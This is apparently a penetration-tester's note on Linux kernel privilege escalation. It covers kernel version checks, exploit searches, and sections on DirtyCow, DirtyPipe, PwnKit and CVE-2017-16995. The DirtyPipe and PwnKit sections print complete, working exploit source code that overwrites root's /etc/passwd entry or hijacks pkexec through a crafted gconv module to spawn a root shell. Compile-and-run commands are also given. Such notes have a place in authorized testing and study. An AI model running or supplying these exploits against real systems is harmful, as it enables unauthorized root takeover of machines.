---
id: Kernel Exploits
aliases: []
tags:
  - Linux/Privesc/Kernel-Exploit
links: "[[Privesc]]"
---

# Kernel Exploit

If a host is not being maintained and running an unpatched
or old operating system, potential kernel vulnerabilities may exist

> [!warning]
>
> Kernel exploits can cause system instability,
> caution when running an exploit against a production system

___

<!-- Kernel Version {{{-->
## Kernel Version

Check kernel version

```sh
uname -r
```

```sh
uname -a
```

```sh
cat /proc/version
```

```sh
cat /etc/os-release
```

```sh
cat /etc/lsb-release
```
___
<!-- }}} -->

<!-- Exploits {{{-->
## Exploits

<!-- Public Exploits {{{-->
### Public Exploits

[[SearchSploit]] — Search for public kernel exploits

```sh
searchsploit "Linux Kernel"
```

<!-- Tip - Kernel Exploit Lists {{{-->
> [!tip]- Kernel Exploit Lists
>
> - [Exloit DB - Binary Exploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)
>
> - [GitHub - Kernel exploits](https://github.com/lucyoa/kernel-exploits)
>
> ```sh
> curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null \
> | grep "Kernels: " \
> | cut -d ":" -f 2 \
> | cut -d "<" -f 1 \
> | tr -d "," \
> | tr ' ' '\n' \
> | grep -v "^d\.d$" \
> | sort -u -r
> ```
<!-- }}} -->

<!-- }}} -->

<!-- DirtyCow {{{-->
### DirtyCow

[CVE-2016-5195](https://nvd.nist.gov/vuln/detail/cve-2016-5195) —
Linux Kernel <= `3.19.0`-`73.8`

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Exploit DB - Dirty COW Linux Kernel 2.6.22 < 3.9](https://www.exploit-db.com/exploits/40839)
<!-- }}} -->

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> ```sh
> # Make dirtycow stable
> echo 0 > /proc/sys/vm/dirty_writeback_centisecs
> g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
> https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
> https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
> ```
<!-- }}} -->

<!-- }}} -->

<!-- DirtyPipe {{{-->
### DirtyPipe

[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/cve-2022-0847)

<!-- Info {{{-->
> [!info]-
>
> A flaw (*[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/cve-2022-0847)*)
> was found in the way the "flags" member of the new pipe buffer structure
> was lacking proper initialization in `copy_page_to_iter_pipe`
> and `push_pipe` functions in the Linux kernel and could thus contain
> stale values.
>
> An unprivileged local user could use this flaw to write to pages
> in the page cache backed by read only files and as such
> escalate their privileges on the system.
<!-- }}} -->

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> ```sh
> #define _GNU_SOURCE
> #include <unistd.h>
> #include <fcntl.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/stat.h>
> #include <sys/user.h>
>
> #ifndef PAGE_SIZE
> #define PAGE_SIZE 4096
> #endif
>
> /**
>  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
>  * PIPE_BUF_FLAG_CAN_MERGE flag set.
>  */
> static void prepare_pipe(int p[2])
> {
> 	if (pipe(p)) abort();
>
> 	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
> 	static char buffer[4096];
>
> 	/* fill the pipe completely; each pipe_buffer will now have
> 	   the PIPE_BUF_FLAG_CAN_MERGE flag */
> 	for (unsigned r = pipe_size; r > 0;) {
> 		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
> 		write(p[1], buffer, n);
> 		r -= n;
> 	}
>
> 	/* drain the pipe, freeing all pipe_buffer instances (but
> 	   leaving the flags initialized) */
> 	for (unsigned r = pipe_size; r > 0;) {
> 		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
> 		read(p[0], buffer, n);
> 		r -= n;
> 	}
>
> 	/* the pipe is now empty, and if somebody adds a new
> 	   pipe_buffer without initializing its "flags", the buffer
> 	   will be mergeable */
> }
>
> int main() {
> 	const char *const path = "/etc/passwd";
>
>         printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
>         FILE *f1 = fopen("/etc/passwd", "r");
>         FILE *f2 = fopen("/tmp/passwd.bak", "w");
>
>         if (f1 == NULL) {
>             printf("Failed to open /etc/passwd\n");
>             exit(EXIT_FAILURE);
>         } else if (f2 == NULL) {
>             printf("Failed to open /tmp/passwd.bak\n");
>             fclose(f1);
>             exit(EXIT_FAILURE);
>         }
>
>         char c;
>         while ((c = fgetc(f1)) != EOF)
>             fputc(c, f2);
>
>         fclose(f1);
>         fclose(f2);
>
> 	loff_t offset = 4; // after the "root"
> 	const char *const data = ":$1$antx-soc$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt antx-soc antx-soc
>         printf("Setting root password to \"antx-soc\"...\n");
> 	const size_t data_size = strlen(data);
>
> 	if (offset % PAGE_SIZE == 0) {
> 		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
> 	const loff_t end_offset = offset + (loff_t)data_size;
> 	if (end_offset > next_page) {
> 		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* open the input file and validate the specified offset */
> 	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
> 	if (fd < 0) {
> 		perror("open failed");
> 		return EXIT_FAILURE;
> 	}
>
> 	struct stat st;
> 	if (fstat(fd, &st)) {
> 		perror("stat failed");
> 		return EXIT_FAILURE;
> 	}
>
> 	if (offset > st.st_size) {
> 		fprintf(stderr, "Offset is not inside the file\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	if (end_offset > st.st_size) {
> 		fprintf(stderr, "Sorry, cannot enlarge the file\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* create the pipe with all flags initialized with
> 	   PIPE_BUF_FLAG_CAN_MERGE */
> 	int p[2];
> 	prepare_pipe(p);
>
> 	/* splice one byte from before the specified offset into the
> 	   pipe; this will add a reference to the page cache, but
> 	   since copy_page_to_iter_pipe() does not initialize the
> 	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
> 	--offset;
> 	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
> 	if (nbytes < 0) {
> 		perror("splice failed");
> 		return EXIT_FAILURE;
> 	}
> 	if (nbytes == 0) {
> 		fprintf(stderr, "short splice\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	/* the following write will not create a new pipe_buffer, but
> 	   will instead write into the page cache, because of the
> 	   PIPE_BUF_FLAG_CAN_MERGE flag */
> 	nbytes = write(p[1], data, data_size);
> 	if (nbytes < 0) {
> 		perror("write failed");
> 		return EXIT_FAILURE;
> 	}
> 	if ((size_t)nbytes < data_size) {
> 		fprintf(stderr, "short write\n");
> 		return EXIT_FAILURE;
> 	}
>
> 	char *argv[] = {"/bin/sh", "-c", "(echo antx-soc; cat) | su - -c \""
>                 "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
>                 "cp /tmp/passwd.bak /etc/passwd;"
>                 "echo \\\"Done! Popping shell... (run commands now)\\\";"
>                 "/bin/sh;"
>             "\" root"};
>         execv("/bin/sh", argv);
>
>         printf("system() function call seems to have failed :(\n");
> 	return EXIT_SUCCESS;
> }
> ```
<!-- }}} -->

<!-- }}} -->

<!-- PwnKit {{{-->
### PwnKit

[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034) —
The PwnKit vulnerability affects PolicyKit’s `pkexec`

<!-- Affected Versions {{{-->
> [!todo]- Affected Versions
>
> Debian
>
> - < `0.105-18+deb9u2` (stretch)
> - < `0.105-25+deb10u1` (buster)
> - < `0.105-31+deb11u1` (bullseye)
> - < `0.105-31.1` (unstable / bookworm)
>
> Ubuntu
>
> - 14.04 ESM: < `policykit-1 0.105-4ubuntu3.14.04.6+esm1`
> - 16.04 ESM: < `policykit-1 0.105-14.1ubuntu0.5+esm1 `
> - 18.04 LTS: < `policykit-1 0.105-20ubuntu0.18.04.6 `
> - 20.04 LTS: < `policykit-1 0.105-26ubuntu1.2 `
> - 21.10: < `policykit-1 0.105-31ubuntu0.1 `
>
> RHEL/CentOS 6
>
> - polkit < `0.96-11.el6_10.2`
>
> RHEL/CentOS 7
>
> - polkit < `0.112-26.el7_9.1`
>
> RHEL/CentOS 8
>
> - polkit < `0.115-13.el8_5.1`
>
> Fedora
>
> - polkit < `0.120-1.fc35.1`
>
> SUSE Linux Enterprise
>
> - polkit ≥ `0.115-13.el8_5.1`
>
> SUSE SLE 15 SP4+/SP5:
>
> - polkit/libpolkit ≥ `0.116-3.6.1`
<!-- }}} -->

> [!tip]- Exploit
>
> [GitHub - arthepsy/CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c)
>
> ```sh
> /*
>  * Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis <moo@arthepsy.eu>
>  * Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
>  */
> #include <stdio.h>
> #include <stdlib.h>
> #include <unistd.h>
> 
> char *shell = 
> 	"#include <stdio.h>\n"
> 	"#include <stdlib.h>\n"
> 	"#include <unistd.h>\n\n"
> 	"void gconv() {}\n"
> 	"void gconv_init() {\n"
> 	"	setuid(0); setgid(0);\n"
> 	"	seteuid(0); setegid(0);\n"
> 	"	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
> 	"	exit(0);\n"
> 	"}";
> 
> int main(int argc, char *argv[]) {
> 	FILE *fp;
> 	system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
> 	system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
> 	fp = fopen("pwnkit/pwnkit.c", "w");
> 	fprintf(fp, "%s", shell);
> 	fclose(fp);
> 	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
> 	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
> 	execve("/usr/bin/pkexec", (char*[]){NULL}, env);
> }
> ```

<!-- }}} -->

<!-- CVE-2017-16995 {{{-->
### CVE-2017-16995

[CVE-2017-16995](https://nvd.nist.gov/vuln/detail/cve-2017-16995) —
Linux Kernel < `4.4.0-116` (*Ubuntu `16.04.4`*)

<!-- Info {{{-->
> [!info]-
>
> An arbitrary memory `r`/`w` access issue was found
> in the Linux kernel compiled with the `eBPF bpf(2)` system call
> (`CONFIG_BPF_SYSCALL`) support.
> The issue could occur due to calculation errors
> in the eBPF verifier module,
> triggered by user supplied malicious BPF program.
>
> An unprivileged user could use this flaw to escalate their privileges on a system.
>
> Setting parameter `kernel.unprivileged_bpf_disabled=1`
> prevents such privilege escalation by restricting access to `bpf(2)` call
<!-- }}} -->

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> - [Exploit-DB](https://www.exploit-db.com/exploits/44298)
> - [Vulners](https://vulners.com/zdt/1337DAY-ID-30003)
<!-- }}} -->

Compile & Run exploit

```sh
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

```sh
./kernel_exploit
```

<!-- }}} -->

___
<!-- }}} -->
